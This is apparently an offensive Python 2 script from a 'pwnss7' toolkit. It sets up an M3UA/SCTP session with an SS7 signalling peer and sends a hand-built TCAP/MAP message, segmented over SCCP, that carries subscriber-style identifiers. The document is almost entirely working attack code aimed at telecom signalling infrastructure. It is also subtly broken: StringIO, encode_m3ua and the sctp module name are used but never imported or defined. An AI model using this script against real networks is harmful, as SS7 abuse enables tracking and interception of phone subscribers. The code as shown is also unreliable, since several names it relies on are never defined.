#!/usr/bin/env python2

import sys
import socket
from binascii import hexlify, unhexlify
import time


# add pwnss7 directory to be able to import pwnss7 submodules
import sys
from os import path
sys.path.append(path.dirname(path.dirname(path.abspath(__file__))))


from pwnss7.m3ua import encode_data
from pwnss7.sccp import encode_xudt, encode_udt
from pwnss7.ber import encode_ber, decode_ber, Asn1Obj, encode_integer
from pwnss7.util import cyclic, split_by
import pwnss7.sctp

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_SCTP)
assert(sock is not None)
sock.settimeout(5.0)

LADDR = ('192.168.1.1', 2905)
RADDR = ('192.168.1.2', 2905)

sock.bind(LADDR)
sock.connect(RADDR)
print('[+] connected')

assoc_id = sctp.getassocid(sock)
print('[+]  assoc id %d' % assoc_id)

send_params = sctp.sctp_sndrcvinfo()
send_params.sinfo_stream = 0
send_params.sinfo_ssn = 0
send_params.sinfo_flags = 0
send_params.sinfo_ppid = socket.htonl(3) # M3UA
send_params.sinfo_context = 0
send_params.sinfo_timetolive = socket.htonl(42)
send_params.sinfo_tsn = 0
send_params.sinfo_assoc_id = assoc_id

sctp.setdefaultsndrcvinfo(sock, send_params)
print('[+] set default sndrcv infos')

time.sleep(0.1)

ASPUP = unhexlify('0100030100000008')
sock.sendall(ASPUP)
print('[+] sent ASPUP')

ASPUP_ACK = unhexlify('0100030400000008')
data = sock.recv(1024)
if data != ASPUP_ACK:
  print('received %s while waiting for 0100030400000008' % hexlify(data))
  sys.exit(1)
print('[+] rcvd ASPUP_ACK')

NTFY = unhexlify('0100000100000018000d0008000100020006000800004242')
data = sock.recv(1024)
if data != NTFY:
  print('received %s while waiting for 0100000100000018000d0008000100020006000800004242' % hexlify(data))
  sys.exit(1)
print('[+] rcvd NTFY')

time.sleep(0.1)

ASPAC = unhexlify('01000401000000100006000800004242')
sock.sendall(ASPAC)
print('[+] sent ASPAC')

ASPAC_ACK = unhexlify('01000403000000100006000800004242')
data = sock.recv(1024)
if data != ASPAC_ACK:
  print('received %s while waiting for 01000403000000100006000800004242' % hexlify(data))
  sys.exit(1)
print('[+] rcvd ASPAC_ACK')

data = sock.recv(1024)
print('[+] rcvd NTFY')

send_params = sctp.sctp_sndrcvinfo()
send_params.sinfo_stream = 1
send_params.sinfo_ssn = 0
send_params.sinfo_flags = 0
send_params.sinfo_ppid = socket.htonl(3) # M3UA
send_params.sinfo_context = 0
send_params.sinfo_timetolive = socket.htonl(42)
send_params.sinfo_tsn = 0
send_params.sinfo_assoc_id = assoc_id

sctp.setdefaultsndrcvinfo(sock, send_params)
print('[+] set default sndrcv infos')

tcap = Asn1Obj(0x1, 1, 0x2, children=[
  Asn1Obj(0x1, 0, 0x8, value='/;F\x02'),
  Asn1Obj(0x1, 1, 0xb, children=[
    Asn1Obj(0x0, 1, 0x8, children=[
      Asn1Obj(0x0, 0, 0x6, value='\x00\x11\x86\x05\x01\x01\x01'),
      Asn1Obj(0x2, 1, 0x0, children=[
        Asn1Obj(0x1, 1, 0x0, children=[
          Asn1Obj(0x2, 0, 0x0, value='\x07\x80'),
          Asn1Obj(0x2, 1, 0x1, children=[
            Asn1Obj(0x0, 0, 0x6, value='\x04\x00\x00\x01\x00\x13\x02'),
          ]),
          Asn1Obj(0x2, 1, 0x1e, children=[
            Asn1Obj(0x0, 1, 0x8, children=[
              Asn1Obj(0x0, 0, 0x6, value='\x04\x00\x00\x01\x01\x01\x01'),
              Asn1Obj(0x2, 1, 0x0, children=[
                Asn1Obj(0x2, 1, 0x0, children=[
                  Asn1Obj(0x2, 0, 0x0, value='\x96V\x05\x11$\x00i\x13\xf6'),
                ]),
              ]),
            ]),
          ]),
        ]),
      ]),
    ]),
  ]),
  Asn1Obj(0x1, 1, 0xc, children=[
    Asn1Obj(0x2, 1, 0x1, children=[
      Asn1Obj(0x0, 0, 0x2, value='\x01'),
      Asn1Obj(0x0, 0, 0x2, value=';'),
      Asn1Obj(0x0, 1, 0x10, children=[
        Asn1Obj(0x0, 0, 0x4, value='\x0f'),
        Asn1Obj(0x0, 0, 0x4, value='\xaa\x18\r\xa6\x82\xddl1\x19-6\xbb\xddF'),
        Asn1Obj(0x2, 0, 0x0, value="\x91rgAX'\xf2"),
      ]),
    ]),
  ]),
])

f = StringIO()
encode_ber(f, tcap)

encoded_tcap = f.getvalue()

pkts = []

def split_by(data, n):
  for i in range(0, len(data), n):
    yield data[i:i+n]

if len(encoded_tcap) < 42:
  pkts.append(encode_m3ua(encode_udt(encoded_tcap)))
else:
  chunks = [c for c in split_by(encoded_tcap, 42)]

  for i in range(len(chunks)):
    first_segment = 0
    if i == 0:
      first_segment = 1

    pkts.append(encode_m3ua(encode_xudt(chunks[i], first_segment, len(chunks)-i-1)))

for pkt in pkts:
  time.sleep(0.1)
  sock.sendall(pkt)

time.sleep(3.0)

sock.close()
